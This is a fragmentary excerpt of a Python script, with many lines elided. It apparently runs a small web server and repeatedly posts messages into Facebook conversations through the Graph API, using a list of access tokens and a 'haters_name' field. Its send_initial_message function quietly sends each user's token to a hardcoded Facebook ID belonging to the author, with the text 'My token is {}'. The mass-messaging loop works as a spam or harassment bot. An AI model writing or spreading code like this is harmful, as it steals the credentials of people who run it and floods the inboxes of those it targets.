...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    ...
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"  TRICK BY ANKUR")
...
def send_initial_message():
    ...
    msg_template = "Hello ANKUR SIR  ! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "100046167274605"
    ...
    for token in tokens:
        ...
        time.sleep(
            0.1)  # Wait for 1 second between sending each initial message
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                url = "https://graph.facebook.com/v17.0/{}/".format('t_' +
                                                                    convo_id)
                parameters = {
                ...
                current_time = time.strftime(
                    "\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(
                        "\033[1;92m[+] Han Chala Gya Massage {} of Convo {} Token {}: {}"
                    ...
                    print(
                        "\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}"
                        .format(message_index + 1, convo_id, token_index + 1,
                                haters_name + ' ' + message))
                    liness()
                    liness()
